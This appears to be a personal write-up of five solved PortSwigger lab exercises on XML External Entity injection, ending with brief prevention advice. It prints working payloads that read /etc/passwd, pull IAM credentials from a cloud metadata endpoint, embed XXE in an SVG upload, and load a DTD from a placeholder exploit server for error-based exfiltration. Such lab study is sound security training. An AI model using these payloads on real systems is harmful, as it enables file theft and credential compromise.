# 🕸️ XXE Injection (XML External Entity)

**Category:** Web Security / Server-Side Injection  
**Focus:** PortSwigger Web Security Academy Labs  
**Status:** ✅ Completed

##  Introduction
XML External Entity (XXE) injection is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.



##  Solved Labs & Techniques

### 1. Exploiting XXE using external entities to retrieve files
**Objective:** Retrieve the content of `/etc/passwd`.

* **Vulnerability:** The application parses user-supplied XML input without disabling external entities.
* **Technique:** **Basic External Entity Injection**. I define a `DOCTYPE` and an `ENTITY` that points to a local file using the `file://` protocol.
* **Payload:**
    ```xml
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <stockCheck><productId>&xxe;</productId>...</stockCheck>
    ```

### 2. Exploiting XXE to perform SSRF attacks
**Objective:** Target a simulated EC2 metadata service to retrieve IAM secret access keys.

* **Vulnerability:** The server processes external entities and allows HTTP requests (SSRF).
* **Technique:** **Cloud Metadata Enumeration**. I point the entity to the AWS metadata URL (`http://169.254.169.254/`) and traverse the directory structure to find sensitive keys.
* **Payload:**
    ```xml
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "[http://169.254.169.254/latest/meta-data/iam/security-credentials/admin](http://169.254.169.254/latest/meta-data/iam/security-credentials/admin)"> ]>
    ```

### 3. Exploiting XInclude to retrieve files
**Objective:** Retrieve `/etc/passwd` when the application does not allow defining a `DOCTYPE` or modifying the XML structure directly.

* **Vulnerability:** The application embeds user input into a backend XML document that enables `XInclude` by default.
* **Technique:** **XInclude Attack**. Since i cannot modify the `DOCTYPE`, i use the `xi:include` element within the data payload to reference the file.
* **Payload:**
    ```xml
    <foo xmlns:xi="[http://www.w3.org/2001/XInclude](http://www.w3.org/2001/XInclude)"><xi:include parse="text" href="file:///etc/passwd"/></foo>
    ```

### 4. Exploiting XXE via image file upload
**Objective:** Execute arbitrary XML code by uploading a malicious image.

* **Vulnerability:** The application allows users to upload avatars but uses an insecure library to process **SVG** (Scalable Vector Graphics) files, which are XML-based.
* **Technique:** **Malicious SVG Injection**. I craft an SVG file containing an XXE payload that reads the server's hostname and renders it as text within the image.
* **Payload (evil.svg):**
    ```xml
    <?xml version="1.0" standalone="yes"?>
    <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
    <svg width="128px" height="128px" xmlns="[http://www.w3.org/2000/svg](http://www.w3.org/2000/svg)" version="1.1">
       <text font-size="16" x="0" y="16">&xxe;</text>
    </svg>
    ```

### 5. Exploiting blind XXE to retrieve data via error messages
**Objective:** Extract `/etc/passwd` from a Blind XXE vulnerability where no output is returned.

* **Vulnerability:** The application suppresses normal output but displays verbose error messages.
* **Technique:** **Error-Based Exfiltration**. I use an external malicious DTD to trigger a "File Not Found" error that includes the content of the target file in the error message itself.
* **Malicious DTD (hosted on exploit server):**
    ```xml
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
    %eval;
    %error;
    ```
* **Injection Payload:**
    ```xml
    <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://EXPLIOT-SERVER-URL/exploit"> %xxe;]>
    ```

##  Prevention

1.  **Disable External Entities (XXE):** The most effective defense is to disable the parsing of external entities and DTDs in the application's XML parser configuration.
2.  **Use Safer Formats:** Whenever possible, use JSON instead of XML.
3.  **Patch Libraries:** Ensure all XML processors and libraries are up to date.